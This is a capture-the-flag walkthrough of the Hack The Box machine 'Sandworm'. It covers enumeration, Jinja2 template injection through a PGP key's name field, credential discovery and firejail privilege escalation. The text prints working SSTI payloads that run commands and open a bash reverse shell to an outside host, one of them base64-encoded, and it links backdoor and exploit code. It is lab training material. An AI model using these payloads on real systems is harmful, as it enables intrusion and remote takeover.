# Sandworm

Linux . Medium

## Enumeration

### Initial Nmap Scan

The enumeration began with an Nmap scan, deploying the following command:

```
nmap -sCV -p- {machine IP}
```

The scan disclosed several key findings.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/f852ac3b-c762-46d3-a2cf-446639f2e2d7)

We discerned that ports 22, 80, and 443 were open on the server. Furthermore, a domain name was discovered and subsequently added to the /etc/hosts file.

### Delving into the Web Application

A noteworthy page, "Contact", allowed us to submit encrypted text. Interestingly, this page contained a link to another page labeled "Guide", which offered functionality to encrypt and decrypt messages using a given public key.

To enumerate directories within the webpage, we employed the tool 'ffuf', utilizing the following command:

```
ffuf -w /usr/share/dirb/wordlists/big.txt -u {url} -c -v
```

![image](https://github.com/vsang181/Hackthebox/assets/28651683/cc2bf803-b8e8-4e2b-824a-503ec8c48b0b)

To enumerate directories within the webpage, we employed the tool 'ffuf', utilizing the following command:

The public key was found hosted on a "/pgp" page.

Attention was then turned to dissecting the functionality of the "/guide" page.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/7ae373fd-a2b7-49e3-ba0d-c5e7fdf2521d)

Our next step was to explore the basic functionality of the webpage.
We decided to sign a message with the provided PGP Public Key and test the web functionality.

To generate our encrypted text, we leveraged the "gpg" tool.

Having a signed message and a public key at our disposal, we stored these in files named 'message.txt' and 'publickey.asc' respectively.

We then proceeded to use the following commands to import the public key and verify the message:

```
gpg --import publickey.asc
gpg --verify message.txt
```

These commands successfully verified the integrity of the message. With this verification, we went ahead and crafted our own message, signing it with the supplied PGP public key.

The command used to sign our crafted message was as follows:

```
gpg --clear-sign message.txt
```

After trying all the available input fields, we realized that the final input box, where we could verify our signature, could accept our own public key along with a message signed with our private key.

This promising discovery led us to speculate that an injection might be possible. We proceeded to create our own pair of public and private keys, signing a test message for this purpose.

Using the command 'gpg --gen-key', we were able to generate our own set of keys.

While providing our real name for the key generation process, and after numerous trials, we discovered a Server-Side Template Injection (SSTI) vulnerability in the "Real name" field during key creation.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/bff4cc3a-1f41-4975-9808-9c0c1981c5b2)

We referenced a particular document while experimenting with different payloads.

[SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

With our self-generated public key and a signed message, we were successfully able to confirm the SSTI.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/8d03cd95-a1d3-4849-8925-1b0d5b196e2e)

This information hinted at the likelihood of a "Jinja2" template engine for Python running in the background, which handled the mathematical calculation

![image](https://github.com/vsang181/Hackthebox/assets/28651683/5c966fde-7ada-43b2-9382-1e6bb1634a89)

## Exploitation

Following the confirmation of the server-side template injection vulnerability in the web application, and with indications pointing towards the usage of the "Jinja2" template engine, we embarked on the exploitation phase.

Our next step was to upload a shell. To streamline our work, we chose to delete our existing keys, reducing the number of keys we were dealing with.

We employed the following payload to execute the 'id' command:

```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
```

![image](https://github.com/vsang181/Hackthebox/assets/28651683/333b5f50-784c-4870-8f57-8e81fce86d7f)

The payload's execution revealed a username: 'atlas'.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/dc502ff1-411c-48e5-a317-6f8408864c8d)

To progress, we decided to upload a shell using this command:

```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -i >& /dev/tcp/10.10.14.40/1234 0>&1').read() }}
```

However, we encountered an issue with certain characters not being accepted as input during key generation. To circumvent this, we base64 encoded the command, which led us to this revised version:

```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MC8xMjM0IDA+JjE=" | base64 --decode | bash').read() }}
```

![image](https://github.com/vsang181/Hackthebox/assets/28651683/ccbbcb84-f397-457e-b451-7669b2e587e4)

The utilization of this revised payload successfully yielded a reverse shell.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/fe089d64-3a9b-41b8-b92a-5b4129d8652a)

Upon exploration of the target machine, we discovered a hidden folder in the home directory of the user 'atlas' labeled '.config'.

Within this '.config' directory, we found a file path: "/.config/httpie/sessions/localhost_5000/admin.json".

Upon inspection, this file revealed the password for the user 'silentobserver'.

![image (1)](https://github.com/vsang181/Hackthebox/assets/28651683/44dd7f96-e241-4192-8411-48835324e053)

Utilizing this password to establish an SSH session with the machine allowed us to secure the user flag.

## Privilege Escalation

To explore the permissions for the user "atlas", we ran 'linpeas' on the target system, scanning for potential vulnerabilities that could be leveraged for privilege escalation.

The results from 'linpeas' were promising; we discovered a cleansed process at "/opt/tipnet".

![image](https://github.com/vsang181/Hackthebox/assets/28651683/7bc91e06-3730-40eb-b120-d6ee5f5e2ce8)

Notably, we located an executable for our SSH session at "/opt/tipnet/target/debug".

![image](https://github.com/vsang181/Hackthebox/assets/28651683/ca95bd9a-2222-44e3-ba5d-4f107efa78a3)

[TIPNet](https://www.rapiscansystems.com/en/products/rapiscan-threat-image-projection-network)

Upon investigating the "tipnet.d" file, we obtained the following output:

![image](https://github.com/vsang181/Hackthebox/assets/28651683/9576bfef-8853-4d95-a310-3996311afab8)

When we inspected the permissions for the files "/opt/crates/logger/src/lib.rs" and "/opt/tipnet/src/main.rs", we found we could edit them, thanks to our write permissions.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/5e7e6302-217d-4212-9eaf-bc7d86db2d35)

The next step was to analyze the code...

When executing "tipnet" and selecting the option "e" for pull mode, it initiates the function "pull_indices". Subsequently, this function calls upon the 'log' function in 'logger'. Given that the 'silentobserver' user possesses write permissions for the logger catalog, we can modify the source code of 'logger'. By then waiting for 'atlas' to execute and re-running 'tipnet', we can successfully reaccess the 'atlas' user shell.

A bit of online research led us to this solution:

[Rust-Backdoors](https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs)

We simply need to add this backdoor to the "lib.rs" file located at "/opt/crates/logger/src".

After restarting our 'nc' listener, we used the 'cargo build' command to compile the code.

```
cargo build
```

![image](https://github.com/vsang181/Hackthebox/assets/28651683/5ab43bad-80b9-40e4-aea1-5a4b5e2173f3)

Following the compilation, we regained access to our 'atlas' shell, now with an additional group, "jailer".

![image](https://github.com/vsang181/Hackthebox/assets/28651683/99765c17-e911-4ed7-8ce9-e6fe3630b5ea)

We then conducted a search with 'SUID 4000', which uncovered "firejail".

![image](https://github.com/vsang181/Hackthebox/assets/28651683/dcef4115-4d08-4bf0-b7e3-05737786fe2f)

It transpires that the 'jailer' group holds the execution privileges for this file.

A brief online search revealed an exploit for "firejail". We placed this in the "/tmp" directory and executed it with 'python3 ./exploit.py'.

[exploit.py](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25#file-exploit-py)

```
python3 ./exploit.py
```

To ensure the exploit ran successfully, we set up a second terminal (a lesson learned from multiple previous failed attempts).

At this point, we received the following message:

![image](https://github.com/vsang181/Hackthebox/assets/28651683/e06caebd-77a5-4b7d-8206-68062fa03d3e)

We then turned to our pre-setup second terminal and executed the commands

```
firejail --join={your PID}
sudo su-
```

Lastly, we used the 'su -' command to gain root access, marking the successful completion of our privilege escalation.

![image (3)](https://github.com/vsang181/Hackthebox/assets/28651683/cb3a1c70-bf82-477e-bb9b-61d130f7b470)

## Let's Connect

I welcome your insights, feedback, and opportunities for collaboration. Together, we can make the digital world safer, one challenge at a time.

- **LinkedIn**: (https://www.linkedin.com/in/aashwadhaama/)

I look forward to connecting with fellow cybersecurity enthusiasts and professionals to share knowledge and work together towards a more secure digital environment.
